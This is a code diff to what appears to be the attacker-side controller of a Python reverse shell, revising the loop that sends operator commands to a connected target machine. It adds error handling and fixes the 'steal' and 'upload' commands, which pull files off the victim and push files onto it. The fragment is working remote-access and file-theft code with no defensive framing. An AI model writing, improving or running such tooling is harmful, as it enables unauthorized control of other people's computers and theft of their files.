@@ -58,21 +58,24 @@ def upload(target, file_name):
     target.send(f.read())
 def communicate(target, ip):
     while(True):
-        command = input("shell~%s" % str(ip))
-        reliable_send(command, target)
-        if command == "exit":
-            quit()
-        if command[:3] == "cd ":
-            pass
-        if command == "clear":
-            os.system('cls||clear')
-        if command[:5] == "steal":
-            upload(target, command[5:])
-        if command[:6] == "upload":
-            download(target, command[6:])
-        else:
-            result = reliable_receive(target)
-            print(result)
+        try:
+            command = input("shell~%s" % str(ip))
+            reliable_send(command, target)
+            if command == "exit":
+                quit()
+            elif command[:3] == "cd ":
+                pass
+            elif command == "clear":
+                os.system('cls||clear')
+            elif command[:5] == "steal":
+                download(target, command[6:])
+            elif command[:6] == "upload":
+                upload(target, command[7:])
+            else:
+                result = reliable_receive(target)
+                print(result)
+        except Exception as e:
+            print(e)
 
 interface = input("# Step 1: Specify network interface to use\n"
                      f"# all interfaces: {interfaces}\n"
